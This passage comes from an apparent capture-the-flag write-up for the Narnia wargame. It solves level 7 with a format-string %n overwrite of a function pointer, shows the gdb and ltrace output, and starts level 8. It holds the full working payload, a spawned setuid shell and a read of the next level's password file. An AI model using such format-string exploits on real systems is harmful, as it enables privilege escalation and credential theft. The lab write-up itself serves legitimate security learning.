    &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(buffer,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer));&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;goodfunction() = %p&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;hackedfunction() = %p&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hackedfunction);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;before : ptrf() = %p (%p)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf,&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I guess you want to come to the hackedfunction...&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;sleep(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;goodfunction;&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;snprintf(buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;format);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ptrf();&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;fprintf(stderr,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Usage: %s &amp;lt;buffer&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(vuln(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]));&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;goodfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Welcome to the goodfunction, but i said the Hackedfunction..&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;
        
    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;hackedfunction&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Way to go!!!!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;The presence of &lt;code&gt;snprintf&lt;/code&gt; indicates that this will be another format string attack.
Great, another one of my least favourites. This should help imprint it on my
brain though, so let&amp;rsquo;s attack this&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd &amp;lt;+0&amp;gt;:	push   %ebp
   0x080485ce &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x080485d0 &amp;lt;+3&amp;gt;:	sub    $0xa8,%esp
   0x080485d6 &amp;lt;+9&amp;gt;:	movl   $0x80,0x8(%esp)
   0x080485de &amp;lt;+17&amp;gt;:	movl   $0x0,0x4(%esp)
   0x080485e6 &amp;lt;+25&amp;gt;:	lea    -0x88(%ebp),%eax
   0x080485ec &amp;lt;+31&amp;gt;:	mov    %eax,(%esp)
   0x080485ef &amp;lt;+34&amp;gt;:	call   0x80484b0 &amp;lt;memset@plt&amp;gt;
   0x080485f4 &amp;lt;+39&amp;gt;:	movl   $0x80486e0,0x4(%esp)
   0x080485fc &amp;lt;+47&amp;gt;:	movl   $0x80487d0,(%esp)
   0x08048603 &amp;lt;+54&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048608 &amp;lt;+59&amp;gt;:	movl   $0x8048706,0x4(%esp)
   0x08048610 &amp;lt;+67&amp;gt;:	movl   $0x80487e5,(%esp)
   0x08048617 &amp;lt;+74&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x0804861c &amp;lt;+79&amp;gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 &amp;lt;+89&amp;gt;:	mov    -0x8c(%ebp),%eax
   0x0804862c &amp;lt;+95&amp;gt;:	lea    -0x8c(%ebp),%edx
   0x08048632 &amp;lt;+101&amp;gt;:	mov    %edx,0x8(%esp)
   0x08048636 &amp;lt;+105&amp;gt;:	mov    %eax,0x4(%esp)
   0x0804863a &amp;lt;+109&amp;gt;:	movl   $0x80487fd,(%esp)
   0x08048641 &amp;lt;+116&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
   0x08048646 &amp;lt;+121&amp;gt;:	movl   $0x8048818,(%esp)
   0x0804864d &amp;lt;+128&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
   0x08048652 &amp;lt;+133&amp;gt;:	movl   $0x2,(%esp)
   0x08048659 &amp;lt;+140&amp;gt;:	call   0x8048440 &amp;lt;sleep@plt&amp;gt;
   0x0804865e &amp;lt;+145&amp;gt;:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 &amp;lt;+155&amp;gt;:	mov    0x8(%ebp),%eax
   0x0804866b &amp;lt;+158&amp;gt;:	mov    %eax,0x8(%esp)
   0x0804866f &amp;lt;+162&amp;gt;:	movl   $0x80,0x4(%esp)
   0x08048677 &amp;lt;+170&amp;gt;:	lea    -0x88(%ebp),%eax
   0x0804867d &amp;lt;+176&amp;gt;:	mov    %eax,(%esp)
   0x08048680 &amp;lt;+179&amp;gt;:	call   0x80484c0 &amp;lt;snprintf@plt&amp;gt;
   0x08048685 &amp;lt;+184&amp;gt;:	mov    -0x8c(%ebp),%eax
   0x0804868b &amp;lt;+190&amp;gt;:	call   *%eax
   0x0804868d &amp;lt;+192&amp;gt;:	leave  
   0x0804868e &amp;lt;+193&amp;gt;:	ret    
End of assembler dump.
(gdb) break *0x08048685
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So disassmble the &lt;code&gt;vuln&lt;/code&gt; function and set a break point just
before the call of the function pointer. In the process of this challenge
I learned of a nice way to determine the number of &lt;code&gt;%x&lt;/code&gt; you need. Using
&lt;code&gt;ltrace&lt;/code&gt; it&amp;rsquo;s possible to increment the number of &lt;code&gt;%x&lt;/code&gt;&amp;rsquo;s until you
see your string in the output again. I&amp;rsquo;ll paste only the correcy output here&lt;/p&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia7@melinda:/narnia$ ltrace ./narnia7 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;`&lt;/span&gt;
__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &amp;lt;unfinished ...&amp;gt;
memset(0xffffd630, &amp;#39;\0&amp;#39;, 128)                                = 0xffffd630
printf(&amp;quot;goodfunction() = %p\n&amp;quot;, 0x80486e0goodfunction() = 0x80486e0
)                   = 27
printf(&amp;quot;hackedfunction() = %p\n\n&amp;quot;, 0x8048706hackedfunction() = 0x8048706

)               = 30
printf(&amp;quot;before : ptrf() = %p (%p)\n&amp;quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
) = 41
puts(&amp;quot;I guess you want to come to the &amp;quot;...I guess you want to come to the hackedfunction...
)                  = 50
sleep(2)                                                     = 0
snprintf(&amp;quot;aaaabbbb8048238ffffd688f7ffda940&amp;quot;..., 128, &amp;quot;aaaabbbb%x%x%x%x%x%x%x&amp;quot;, 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
puts(&amp;quot;Welcome to the goodfunction, but&amp;quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                  = 61
fflush(0xf7fcaac0)                                           = 0
exit(0 &amp;lt;no return ...&amp;gt;
+++ exited (status 0) +++
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;You can see the &lt;em&gt;aaaa&lt;/em&gt; and &lt;em&gt;bbbb&lt;/em&gt; at line 14. So we have 7 &lt;code&gt;%x&lt;/code&gt; to get the second value.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s take a look at the stack with that input&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;)
Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaabbbb&amp;#39; + &amp;#39;%x&amp;#39;*7&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486e0
0xffffd610:	0x61616161	0x62626262	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x36313631
0xffffd640:	0x36323632	0x00323632	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So at &lt;code&gt;0xffffd60c&lt;/code&gt; is the address of &lt;code&gt;goodfunction&lt;/code&gt;. We need to overwrite that
to point to &lt;code&gt;0x8048706&lt;/code&gt;, our &lt;code&gt;hackedfunction&lt;/code&gt;. So as before in &lt;a href=&#34;http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05&#34;&gt;level 05&lt;/a&gt;
we use &lt;code&gt;%n&lt;/code&gt; to try and overwrite this value.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*6 + &amp;#39;%n&amp;#39;&amp;quot;)

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*6 + &amp;#39;%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x0000002f
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x00313631
0xffffd640:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb)
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The value of &lt;em&gt;2f&lt;/em&gt; at &lt;code&gt;0xffffd60c&lt;/code&gt; shows us that our overwrite was successful
and we wrote the value of &lt;em&gt;47&lt;/em&gt;. We need to write &lt;code&gt;0x8048706&lt;/code&gt; which is &lt;em&gt;134514438&lt;/em&gt; in decimal.
So let&amp;rsquo;s add our &lt;code&gt;%d&lt;/code&gt; in and remember to adjust the number of &lt;code&gt;%x&lt;/code&gt;s too, so we can see
how much padding we need&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x00000031
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x31306536	0x37333336	0x37383137
0xffffd640:	0x00000033	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Ok, so &lt;code&gt;0x8048706 - 0x00000031 = 0x80486d6&lt;/code&gt; or &lt;em&gt;134514389&lt;/em&gt; in decimal.
Let&amp;rsquo;s see if I&amp;rsquo;m right&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514389d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514389d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486fc
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Still a little off. Adjusting the value again&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x08048706
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
(gdb) c
Continuing.
Way to go!!!!$
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;And now we need to run it from the commandline to actually get a proper setuid shell&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia7@melinda:/narnia$ .//narnia7 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@melinda:/narnia$ .//narnia7 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa\x1c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whomai
/bin/sh: 1: whomai: not found
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8 
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Notice that the address of &lt;code&gt;ptrf&lt;/code&gt; is not the same in the shell :)&lt;/p&gt;

&lt;h2 id=&#34;level-08:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 08&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// gcc&amp;#39;s variable reordering fucked things up&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// to keep the level in its old style i am &lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// making &amp;quot;i&amp;quot; global unti i find a fix &lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// -morla &lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt; 

&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;func&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;b){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;blah&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;b;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;bok[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #75715e&#34;&gt;//int i=0;&lt;/span&gt;
    
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(bok,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(bok));&lt;/span&gt;
